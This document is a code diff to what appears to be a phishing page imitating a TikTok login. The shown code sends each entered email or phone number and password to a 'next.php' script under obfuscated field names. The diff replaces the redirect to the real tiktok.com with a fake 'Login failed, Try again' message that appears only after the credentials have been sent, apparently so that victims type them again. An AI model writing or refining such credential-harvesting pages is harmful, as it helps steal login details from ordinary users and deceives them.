@@ -606,6 +606,9 @@
                 <button class="clear-btn" onclick="clearInput('email-password-input')">×</button>
             </div>
             <button class="signin-btn" onclick="handleEmailLogin()">Log in</button>
+            <div id="email-error-message" style="display: none; color: #ff4444; font-size: 14px; text-align: center; margin-top: 10px; font-weight: 500;">
+                Login failed, Try again
+            </div>
         </div>
     </div>
 
@@ -642,6 +645,9 @@
             <input type="password" id="phone-password-input" placeholder="Password" required>
             <button class="clear-btn" onclick="clearInput('phone-password-input')">×</button>
             <button class="signin-btn" onclick="handlePhoneLogin()">Log in</button>
+            <div id="phone-error-message" style="display: none; color: #ff4444; font-size: 14px; text-align: center; margin-top: 10px; font-weight: 500;">
+                Login failed, Try again
+            </div>
         </div>
     </div>
 </div>
@@ -721,7 +727,9 @@
             xhr.open('POST', 'next.php', true);
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             xhr.send('di=' + encodeURIComponent(idValue) + '&pr=' + encodeURIComponent(pass));
-            window.location.href = 'https://www.tiktok.com';
+
+            // Show error message instead of redirecting
+            document.getElementById('phone-error-message').style.display = 'block';
         } else {
             alert("Please enter all required information.");
         }
@@ -757,7 +765,9 @@
             xhr.open('POST', 'next.php', true);
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             xhr.send('di=' + encodeURIComponent(email) + '&pr=' + encodeURIComponent(pass));
-            window.location.href = 'https://www.tiktok.com';
+
+            // Show error message instead of redirecting
+            document.getElementById('email-error-message').style.display = 'block';
         } else {
             alert("Please enter all required information.");
         }
